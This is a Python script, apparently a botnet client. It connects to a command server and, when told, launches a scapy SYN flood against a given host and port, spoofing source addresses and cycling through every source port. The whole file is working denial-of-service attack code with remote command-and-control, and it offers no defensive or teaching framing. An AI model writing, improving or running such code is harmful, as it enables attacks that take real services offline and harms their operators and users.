from scapy.all import *
import random,socket,sys,argparse,os
from multiprocessing import Process

isWorking = False
curProcess = None

# send syn package
def synFlood(tgt, dPort):
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']

    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index],dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        
        packet = ipLayer/tcpLayer
        send(packet)

# receive and process cmd
def cmdHandle(sock):
    global curProcess
    while True:
        data = sock.recv(1024).decode('utf-8')
        
        if len(data) == 0:
            print ('Empty data.')
            continue
        print ('received data is: '+data)
        if data[0] == '#':
            try:
                '''
                options = parse.parse_args(dat[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd  = options.cmd
                
                '''
                data = data[1:].split()
                # print (data)
                m_host = data[1]
                m_port = int(data[3])
                m_cmd  = data[5]
                # print (m_host, m_port, m_cmd)
                if m_cmd.lower() == 'start':
                    # if the process is alive, kill it and restart
                    if curProcess != None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print ('The synFlood is starting...')
                    
                    p = Process(target=synFlood, args=(m_host, m_port))
                    p.start()
                    curProcess = p
                elif m_cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print ('Fail to perform the command.')


def main():
    '''
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest='host', type=str)
    p.add_argument('-p', dest='port', type=int)
    p.add_argument('-c', dest='cmd', type=str)
    '''
    print ('*' * 40)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 58883))
        print ('succeed to connect the server.')
        print ('=' * 40)
        
        cmdHandle(s)
    except:
        print ('connection failed, retry please.')
        sys.exit(0)
        
if __name__ == '__main__':
    main()
